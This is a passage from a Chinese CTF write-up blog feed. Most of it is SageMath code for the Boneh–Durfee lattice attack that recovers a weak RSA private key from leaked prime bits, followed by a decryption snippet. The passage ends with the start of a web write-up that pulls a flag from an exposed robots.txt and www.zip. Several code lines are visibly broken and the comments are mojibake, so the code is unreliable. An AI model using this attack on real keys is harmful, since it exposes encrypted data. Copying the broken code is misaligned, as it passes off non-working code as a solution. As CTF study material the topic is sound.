class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        <span class="keyword">if</span> BB[ii,ii] &gt;= modulus:</span><br><span class="line">            nothelpful += <span class="number">1</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#print (nothelpful, &quot;/&quot;, BB.dimensions()[0], &quot; vectors are not helpful&quot;)</span></span><br><span class="line"><span class="comment"># æ˜¾ç¤ºå¸¦æœ‰ 0 å’Œ X çš„çŸ©é˜µ</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">matrix_overview</span>(<span class="params">BB, bound</span>):</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">        a = (<span class="string">&#x27;%02d &#x27;</span> % ii)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(BB.dimensions()[<span class="number">1</span>]):</span><br><span class="line">            a += <span class="string">&#x27;0&#x27;</span> <span class="keyword">if</span> BB[ii,jj] == <span class="number">0</span> <span class="keyword">else</span> <span class="string">&#x27;X&#x27;</span></span><br><span class="line">            <span class="keyword">if</span> BB.dimensions()[<span class="number">0</span>] &lt; <span class="number">60</span>: </span><br><span class="line">                a += <span class="string">&#x27; &#x27;</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            a += <span class="string">&#x27;~&#x27;</span></span><br><span class="line">        <span class="comment">#print (a)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># å°è¯•åˆ é™¤æ— ç”¨çš„å‘é‡</span></span><br><span class="line"><span class="comment"># ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">remove_unhelpful</span>(<span class="params">BB, monomials, bound, current</span>):</span></span><br><span class="line">    <span class="comment"># æˆ‘ä»¬ä»å½“å‰ = n-1ï¼ˆæœ€åä¸€ä¸ªå‘é‡ï¼‰å¼€å§‹</span></span><br><span class="line">    <span class="keyword">if</span> current == -<span class="number">1</span> <span class="keyword">or</span> BB.dimensions()[<span class="number">0</span>] &lt;= dimension_min:</span><br><span class="line">        <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å¼€å§‹ä»åé¢æ£€æŸ¥</span></span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(current, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">        <span class="comment">#  å¦‚æœå®ƒæ²¡æœ‰ç”¨</span></span><br><span class="line">        <span class="keyword">if</span> BB[ii, ii] &gt;= bound:</span><br><span class="line">            affected_vectors = <span class="number">0</span></span><br><span class="line">            affected_vector_index = <span class="number">0</span></span><br><span class="line">             <span class="comment"># è®©æˆ‘ä»¬æ£€æŸ¥å®ƒæ˜¯å¦å½±å“å…¶ä»–å‘é‡</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(ii + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                <span class="comment"># å¦‚æœå¦ä¸€ä¸ªå‘é‡å—åˆ°å½±å“ï¼š</span></span><br><span class="line">                <span class="comment"># æˆ‘ä»¬å¢åŠ è®¡æ•°</span></span><br><span class="line">                <span class="keyword">if</span> BB[jj, ii] != <span class="number">0</span>:</span><br><span class="line">                    affected_vectors += <span class="number">1</span></span><br><span class="line">                    affected_vector_index = jj</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç­‰çº§ï¼š0</span></span><br><span class="line">            <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–è½½ä½“æœ€ç»ˆå—åˆ°å½±å“</span></span><br><span class="line">            <span class="comment"># æˆ‘ä»¬åˆ é™¤å®ƒ</span></span><br><span class="line">            <span class="keyword">if</span> affected_vectors == <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;* removing unhelpful vector&quot;, ii)</span></span><br><span class="line">                BB = BB.delete_columns([ii])</span><br><span class="line">                BB = BB.delete_rows([ii])</span><br><span class="line">                monomials.pop(ii)</span><br><span class="line">                BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line">           <span class="comment"># ç­‰çº§ï¼š1</span></span><br><span class="line">            <span class="comment">#å¦‚æœåªæœ‰ä¸€ä¸ªå—åˆ°å½±å“ï¼Œæˆ‘ä»¬ä¼šæ£€æŸ¥</span></span><br><span class="line">            <span class="comment"># å¦‚æœå®ƒæ­£åœ¨å½±å“åˆ«çš„å‘é‡</span></span><br><span class="line">            <span class="keyword">elif</span> affected_vectors == <span class="number">1</span>:</span><br><span class="line">                affected_deeper = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(affected_vector_index + <span class="number">1</span>, BB.dimensions()[<span class="number">0</span>]):</span><br><span class="line">                    <span class="comment"># å¦‚æœå®ƒå½±å“å“ªæ€•ä¸€ä¸ªå‘é‡</span></span><br><span class="line">                    <span class="comment"># æˆ‘ä»¬æ”¾å¼ƒè¿™ä¸ª</span></span><br><span class="line">                    <span class="keyword">if</span> BB[kk, affected_vector_index] != <span class="number">0</span>:</span><br><span class="line">                        affected_deeper = <span class="literal">False</span></span><br><span class="line">                <span class="comment"># å¦‚æœæ²¡æœ‰å…¶ä»–å‘é‡å—åˆ°å½±å“ï¼Œåˆ™å°†å…¶åˆ é™¤ï¼Œå¹¶ä¸”</span></span><br><span class="line">                <span class="comment"># è¿™ä¸ªæœ‰ç”¨çš„å‘é‡ä¸å¤Ÿæœ‰ç”¨</span></span><br><span class="line">                <span class="comment">#ä¸æˆ‘ä»¬æ— ç”¨çš„ç›¸æ¯”</span></span><br><span class="line">                <span class="keyword">if</span> affected_deeper <span class="keyword">and</span> <span class="built_in">abs</span>(bound - BB[affected_vector_index, affected_vector_index]) &lt; <span class="built_in">abs</span>(bound - BB[ii, ii]):</span><br><span class="line">                    <span class="comment">#print (&quot;* removing unhelpful vectors&quot;, ii, &quot;and&quot;, affected_vector_index)</span></span><br><span class="line">                    BB = BB.delete_columns([affected_vector_index, ii])</span><br><span class="line">                    BB = BB.delete_rows([affected_vector_index, ii])</span><br><span class="line">                    monomials.pop(affected_vector_index)</span><br><span class="line">                    monomials.pop(ii)</span><br><span class="line">                    BB = remove_unhelpful(BB, monomials, bound, ii-<span class="number">1</span>)</span><br><span class="line">                    <span class="keyword">return</span> BB</span><br><span class="line">    <span class="comment"># nothing happened</span></span><br><span class="line">    <span class="keyword">return</span> BB</span><br><span class="line"> </span><br><span class="line"><span class="string">&quot;&quot;&quot; </span></span><br><span class="line"><span class="string">Returns:</span></span><br><span class="line"><span class="string">* 0,0   if it fails</span></span><br><span class="line"><span class="string">* -1ï¼Œ-1 å¦‚æœ &quot;strict=true&quot;ï¼Œå¹¶ä¸”è¡Œåˆ—å¼ä¸å—çº¦æŸ</span></span><br><span class="line"><span class="string">* x0,y0 the solutions of `pol`</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">boneh_durfee</span>(<span class="params">pol, modulus, mm, tt, XX, YY</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Boneh and Durfee revisited by Herrmann and May</span></span><br><span class="line"><span class="string"> </span></span><br><span class="line"><span class="string"> åœ¨ä»¥ä¸‹æƒ…å†µä¸‹æ‰¾åˆ°è§£å†³æ–¹æ¡ˆï¼š</span></span><br><span class="line"><span class="string">* d &lt; N^delta</span></span><br><span class="line"><span class="string">* |x|&lt; e^delta</span></span><br><span class="line"><span class="string">* |y|&lt; e^0.5</span></span><br><span class="line"><span class="string">æ¯å½“ delta &lt; 1 - sqrtï¼ˆ2ï¼‰/2 ~ 0.292</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># substitution (Herrman and May)</span></span><br><span class="line">    PR.&lt;u, x, y&gt; = PolynomialRing(ZZ)   <span class="comment">#å¤šé¡¹å¼ç¯</span></span><br><span class="line">    Q = PR.quotient(x*y + <span class="number">1</span> - u)        <span class="comment">#  u = xy + 1</span></span><br><span class="line">    polZ = Q(pol).lift()</span><br><span class="line"> </span><br><span class="line">    UU = XX*YY + <span class="number">1</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># x-ç§»ä½</span></span><br><span class="line">    gg = []</span><br><span class="line">    <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(mm + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(mm - kk + <span class="number">1</span>):</span><br><span class="line">            xshift = x^ii * modulus^(mm - kk) * polZ(u, x, y)^kk</span><br><span class="line">            gg.append(xshift)</span><br><span class="line">    gg.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ x ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    monomials = []</span><br><span class="line">    <span class="keyword">for</span> polynomial <span class="keyword">in</span> gg:</span><br><span class="line">        <span class="keyword">for</span> monomial <span class="keyword">in</span> polynomial.monomials(): <span class="comment">#å¯¹äºå¤šé¡¹å¼ä¸­çš„å•é¡¹å¼ã€‚å•é¡¹å¼ï¼ˆï¼‰ï¼š</span></span><br><span class="line">            <span class="keyword">if</span> monomial <span class="keyword">not</span> <span class="keyword">in</span> monomials:  <span class="comment"># å¦‚æœå•é¡¹ä¸åœ¨å•é¡¹ä¸­</span></span><br><span class="line">                monomials.append(monomial)</span><br><span class="line">    monomials.sort()</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># y-ç§»ä½</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            yshift = y^jj * polZ(u, x, y)^kk * modulus^(mm - kk)</span><br><span class="line">            yshift = Q(yshift).lift()</span><br><span class="line">            gg.append(yshift) <span class="comment"># substitution</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># å•é¡¹å¼ y ç§»ä½åˆ—è¡¨</span></span><br><span class="line">    <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, tt + <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> kk <span class="keyword">in</span> <span class="built_in">range</span>(floor(mm/tt) * jj, mm + <span class="number">1</span>):</span><br><span class="line">            monomials.append(u^kk * y^jj)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ„é€ æ ¼ B</span></span><br><span class="line">    nn = <span class="built_in">len</span>(monomials)</span><br><span class="line">    BB = Matrix(ZZ, nn)</span><br><span class="line">    <span class="keyword">for</span> ii <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">        BB[ii, <span class="number">0</span>] = gg[ii](<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, ii + <span class="number">1</span>):</span><br><span class="line">            <span class="keyword">if</span> monomials[jj] <span class="keyword">in</span> gg[ii].monomials():</span><br><span class="line">                BB(UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#çº¦åŒ–æ ¼çš„åŸå‹</span></span><br><span class="line">    <span class="keyword">if</span> helpful_only:</span><br><span class="line">        <span class="comment">#  #è‡ªåŠ¨åˆ é™¤</span></span><br><span class="line">        BB = remove_unhelpful(BB, monomials, modulus^mm, nn-<span class="number">1</span>)</span><br><span class="line">        <span class="comment"># é‡ç½®ç»´åº¦</span></span><br><span class="line">        nn = BB.dimensions()[<span class="number">0</span>]</span><br><span class="line">        <span class="keyword">if</span> nn == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;failure&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>,<span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥å‘é‡æ˜¯å¦æœ‰å¸®åŠ©</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        helpful_vectors(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ£€æŸ¥è¡Œåˆ—å¼æ˜¯å¦æ­£ç¡®ç•Œå®š</span></span><br><span class="line">    det = BB.det()</span><br><span class="line">    bound = modulus^(mm*nn)</span><br><span class="line">    <span class="keyword">if</span> det &gt;= bound:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;We do not have det &lt; bound. Solutions might not be found.&quot;</span>)</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Try with highers m and t.&quot;</span>)</span><br><span class="line">        <span class="keyword">if</span> debug:</span><br><span class="line">            diff = (log(det) - log(bound)) / log(<span class="number">2</span>)</span><br><span class="line">            <span class="built_in">print</span> (<span class="string">&quot;size det(L) - size e^(m*n) = &quot;</span>, floor(diff))</span><br><span class="line">        <span class="keyword">if</span> strict:</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>, -<span class="number">1</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;det(L) &lt; e^(m*n) (good! If a solution exists &lt; N^delta, it will be found)&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># display the lattice basis</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        matrix_overview(BB, modulus^mm)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># LLL</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;optimizing basis of the lattice via LLL, this can take a long time&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment">#BB = BB.BKZ(block_size=25)</span></span><br><span class="line">    BB = BB.LLL()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;LLL is done!&quot;</span>)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># æ›¿æ¢å‘é‡ i å’Œ j -&gt;å¤šé¡¹å¼ 1 å’Œ 2</span></span><br><span class="line">    <span class="keyword">if</span> debug:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;åœ¨æ ¼ä¸­å¯»æ‰¾çº¿æ€§æ— å…³å‘é‡&quot;</span>)</span><br><span class="line">    found_polynomials = <span class="literal">False</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">for</span> pol1_idx <span class="keyword">in</span> <span class="built_in">range</span>(nn - <span class="number">1</span>):</span><br><span class="line">        <span class="keyword">for</span> pol2_idx <span class="keyword">in</span> <span class="built_in">range</span>(pol1_idx + <span class="number">1</span>, nn):</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># å¯¹äºi and j, æ„é€ ä¸¤ä¸ªå¤šé¡¹å¼</span></span><br><span class="line"> </span><br><span class="line">            PR.&lt;w,z&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol1 = pol2 = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> jj <span class="keyword">in</span> <span class="built_in">range</span>(nn):</span><br><span class="line">                pol1 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol1_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line">                pol2 += monomials[jj](w*z+<span class="number">1</span>,w,z) * BB[pol2_idx, jj] / monomials[jj](UU,XX,YY)</span><br><span class="line"> </span><br><span class="line">            <span class="comment"># ç»“æœ</span></span><br><span class="line">            PR.&lt;q&gt; = PolynomialRing(ZZ)</span><br><span class="line">            rr = pol1.resultant(pol2)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> rr.is_zero() <span class="keyword">or</span> rr.monomials() == :</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;found them, using vectors&quot;</span>, pol1_idx, <span class="string">&quot;and&quot;</span>, pol2_idx)</span><br><span class="line">                found_polynomials = <span class="literal">True</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> found_polynomials:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> found_polynomials:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;no independant vectors could be found. This should very rarely happen...&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    rr = rr(q, q)</span><br><span class="line"> </span><br><span class="line">    <span class="comment"># solutions</span></span><br><span class="line">    soly = rr.roots()</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(soly) == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;Your prediction (delta) is too small&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"> </span><br><span class="line">    soly = soly[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    ss = pol1(q, soly)</span><br><span class="line">    solx = ss.roots()[<span class="number">0</span>][<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> solx, soly</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">example</span>():</span></span><br><span class="line">    <span class="comment">############################################</span></span><br><span class="line">    <span class="comment"># éšæœºç”Ÿæˆæ•°æ®</span></span><br><span class="line">    <span class="comment">##########################################</span></span><br><span class="line">    <span class="comment">#start_time =time.perf_counter</span></span><br><span class="line">    start =time.clock()</span><br><span class="line">    size=<span class="number">512</span></span><br><span class="line">    length_N = <span class="number">2</span>*size;</span><br><span class="line">    ss=<span class="number">0</span></span><br><span class="line">    s=<span class="number">70</span>;</span><br><span class="line">    M=<span class="number">1</span>   <span class="comment"># the number of experiments</span></span><br><span class="line">    delta = <span class="number">299</span>/<span class="number">1024</span></span><br><span class="line">    <span class="comment"># p =  random_prime(2^512,2^511)</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(M):</span><br><span class="line"><span class="comment">#         p =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         q =  random_prime(2^size,None,2^(size-1))</span></span><br><span class="line"><span class="comment">#         if(p&lt;q):</span></span><br><span class="line"><span class="comment">#             temp=p</span></span><br><span class="line"><span class="comment">#             p=q</span></span><br><span class="line"><span class="comment">#             q=temp</span></span><br><span class="line">        N = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line">        e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line">        c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line">        hint1 =  <span class="number">597218086872775768003</span></span><br><span class="line">        hint2 =  <span class="number">836339982627318976124</span></span><br><span class="line"><span class="comment">#         print (&quot;pçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(p/2^(512-s)))</span></span><br><span class="line"><span class="comment">#         print (&quot;qçœŸå®é«˜&quot;,s,&quot;æ¯”ç‰¹ï¼š&quot;, int(q/2^(512-s)))</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#         N = p*q;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">    <span class="comment"># è§£å¯†æŒ‡æ•°dçš„æŒ‡æ•°( æœ€å¤§0.292)</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">        m = <span class="number">7</span>   <span class="comment"># æ ¼å¤§å°ï¼ˆè¶Šå¤§è¶Šå¥½/è¶Šæ…¢ï¼‰</span></span><br><span class="line">        t = <span class="built_in">round</span>(((<span class="number">1</span>-<span class="number">2</span>*delta) * m))  <span class="comment"># æ¥è‡ª Herrmann å’Œ May çš„ä¼˜åŒ–</span></span><br><span class="line">        X = floor(N^delta)  <span class="comment"># </span></span><br><span class="line">        Y = floor(N^(<span class="number">1</span>/<span class="number">2</span>)/<span class="number">2</span>^s)    <span class="comment"># å¦‚æœ pã€ q å¤§å°ç›¸åŒï¼Œåˆ™æ­£ç¡®</span></span><br><span class="line">        <span class="keyword">for</span> l <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">int</span>(hint1),<span class="built_in">int</span>(hint1)+<span class="number">1</span>):</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&#x27;\n\n\n l=&#x27;</span>,l)</span><br><span class="line">            pM=l;</span><br><span class="line">            p0=pM*<span class="number">2</span>^(size-s)+<span class="number">2</span>^(size-s)-<span class="number">1</span>;</span><br><span class="line">            q0=N/p0;</span><br><span class="line">            qM=<span class="built_in">int</span>(q0/<span class="number">2</span>^(size-s))</span><br><span class="line">            A = N + <span class="number">1</span>-pM*<span class="number">2</span>^(size-s)-qM*<span class="number">2</span>^(size-s);</span><br><span class="line">        <span class="comment">#A = N+1</span></span><br><span class="line">            P.&lt;x,y&gt; = PolynomialRing(ZZ)</span><br><span class="line">            pol = <span class="number">1</span> + x * (A + y)  <span class="comment">#æ„å»ºçš„æ–¹ç¨‹</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># Checking bounds</span></span><br><span class="line">            <span class="comment">#if debug:</span></span><br><span class="line">                <span class="comment">#print (&quot;=== æ ¸å¯¹æ•°æ® ===&quot;)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta:&quot;, delta)</span></span><br><span class="line">                <span class="comment">#print (&quot;* delta &lt; 0.292&quot;, delta &lt; 0.292)</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of e:&quot;, ceil(log(e)/log(2)))  # eçš„bitæ•°</span></span><br><span class="line">                <span class="comment"># print (&quot;* size of N:&quot;, len(bin(N)))          # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* size of N:&quot;, ceil(log(N)/log(2)))  # Nçš„bitæ•°</span></span><br><span class="line">                <span class="comment">#print (&quot;* m:&quot;, m, &quot;, t:&quot;, t)</span></span><br><span class="line"> </span><br><span class="line">            <span class="comment"># boneh_durfee</span></span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="comment">##print (&quot;=== running algorithm ===&quot;)</span></span><br><span class="line">                start_time = time.time()</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            solx, soly = boneh_durfee(pol, e, m, t, X, Y)</span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> solx &gt; <span class="number">0</span>:</span><br><span class="line">                <span class="comment">#print (&quot;=== solution found ===&quot;)</span></span><br><span class="line">                <span class="keyword">if</span> <span class="literal">False</span>:</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;x:&quot;</span>, solx)</span><br><span class="line">                    <span class="built_in">print</span> (<span class="string">&quot;y:&quot;</span>, soly)</span><br><span class="line"> </span><br><span class="line">                d_sol = <span class="built_in">int</span>(pol(solx, soly) / e)</span><br><span class="line">                ss=ss+<span class="number">1</span></span><br><span class="line"></span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;=== solution found ===&quot;</span>)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;pçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,l)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;qçš„é«˜æ¯”ç‰¹ä¸ºï¼š&quot;</span>,qM)</span><br><span class="line">                <span class="built_in">print</span> (<span class="string">&quot;d=&quot;</span>,d_sol) </span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span> debug:</span><br><span class="line">                <span class="built_in">print</span>(<span class="string">&quot;=== %s seconds ===&quot;</span> % (time.time() - start_time))</span><br><span class="line">            <span class="comment">#break</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;ss=&quot;</span>,ss)</span><br><span class="line">                            <span class="comment">#end=time.process_time</span></span><br><span class="line">        end=time.clock()</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;Running time: %s Seconds&#x27;</span>%(end-start))</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    example()  </span><br></pre></td></tr></table></figure><p><img src="/images/others/beafc4c5fa7767dde8df4f716745e5b.png" alt="image-20220124192143500"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">64421669931279763032337930351371074312763623230334264672272991963587968145469789623226631192910548697947848779021944177739911084383786634595255436873350170397825307930618697902052402139072111389681839113510986333829074390665317265603346122882832568330112945567680656219994967593371244275156478322204419261819</span></span><br><span class="line"></span><br><span class="line">e = <span class="number">31010691142874094705557092175690153458422282630834301371323563655985170293061551914791533335820551677589839843761852199680128997193432075880230502409814741638209947794142932041357373199521605405986705517942961028228255066560857365694517578822510622110740926010357756915595155038827023753366174321207668419113</span></span><br><span class="line"></span><br><span class="line">c = <span class="number">44228757856694834445202355486356318880471120936109992694489050154150768403667631244534149277159399976972028214341072460353357561691320731420869678207365539080035139895735181119706727564445399237943178679966032596522818504363414526390960660239215638736706163678206959509331192083842100728618312517781111784803</span></span><br><span class="line"></span><br><span class="line">hint1 = <span class="number">597218086872775768003</span></span><br><span class="line"></span><br><span class="line">hint2 = <span class="number">836339982627318976124</span></span><br><span class="line"></span><br><span class="line">d= <span class="number">723139209811695466615412520251642069457719866228119412426018806563095539525831453648719201</span></span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>0xGame2023éƒ¨åˆ†wp</title>
      <link href="/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/"/>
      <url>/2023/10/23/0xGame2023%E9%83%A8%E5%88%86wp/</url>
      
        <content type="html"><![CDATA[]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1</title>
      <link href="/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/"/>
      <url>/2023/10/09/2023%E6%96%B0%E7%94%9F%E8%B5%9B/NewStarCTF%202023%20%E5%85%AC%E5%BC%80%E8%B5%9B%E9%81%93%20WEEK1/</url>
      
        <content type="html"><![CDATA[<h3 id="NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK1"><a href="#NewStarCTF-2023-å…¬å¼€èµ›é“-WEEK1" class="headerlink" title="NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1"></a>NewStarCTF 2023 å…¬å¼€èµ›é“ WEEK1</h3><h4 id="web"><a href="#web" class="headerlink" title="web"></a>web</h4><h5 id="WEEK1-WEB-æ³„æ¼çš„ç§˜å¯†"><a href="#WEEK1-WEB-æ³„æ¼çš„ç§˜å¯†" class="headerlink" title="WEEK1|WEB æ³„æ¼çš„ç§˜å¯†"></a>WEEK1|WEB æ³„æ¼çš„ç§˜å¯†</h5><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/robots.txt</a></p><p><a href="http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip">http://cd98ca4d-7c72-4499-9cb1-010764aa19de.node4.buuoj.cn:81/www.zip</a><br>PART ONE: flag{r0bots_1s_s0_us3ful<br>$PART_TWO = â€œ_4nd_<a href="http://www.zip_1s_s0_d4ng3rous}&quot;/">www.zip_1s_s0_d4ng3rous}&quot;</a>;</p><h5 id="WEEK1-WEB-Begin-of-Upload"><a href="#WEEK1-WEB-Begin-of-Upload" class="headerlink" title="WEEK1|WEB Begin of Upload"></a>WEEK1|WEB Begin of Upload</h5><p>å‰ç«¯æ‹¦æˆª<br><img src="/images/xinshengsai/20231011112418.png" alt="image-20220126203415648"></p><h5 id="WEEK1-WEB-Begin-of-HTTP"><a href="#WEEK1-WEB-Begin-of-HTTP" class="headerlink" title="WEEK1|WEB Begin of HTTP"></a>WEEK1|WEB Begin of 